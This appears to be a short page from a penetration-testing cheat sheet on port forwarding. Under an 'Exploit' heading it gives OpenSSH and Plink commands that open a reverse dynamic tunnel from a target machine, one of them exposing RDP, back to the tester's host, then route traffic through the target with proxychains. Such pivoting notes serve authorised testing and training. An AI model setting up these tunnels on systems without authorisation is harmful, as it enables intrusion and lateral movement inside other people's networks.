---
layout: default
title: Port Forwarding
parent: Network
nav_order: 4
permalink: /network/portforwarding/
---

# Port Forwarding
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

Multiple tools can be used to perform port forwarding, depending on your target.
- OpenSSH
- Plink (PuTTY command line)

```bash
# Vreate a remote dynamic port forward to your environement using OpenSSH
ssh -N -R $LPORT $USERNAME@$LHOST

# Create a remote dynamic port forward to your environement using Plink
plink.exe -ssh -l $USERNAME -pw $PASSWORD -R 127.0.0.1:$LPORT:127.0.0.1:3389 $LHOST
```

Once you created the remote dynamic port forward, type following commands on your environement to use it.

```bash
# On your environement, check SOCKS port is opened
ss -ntplu

# Modify your proxychains configuration
echo "socks5 127.0.0.1 $LPORT" >> /etc/proxychains4.conf

# You can now proxychain your commands through your target
proxychains $CMD
```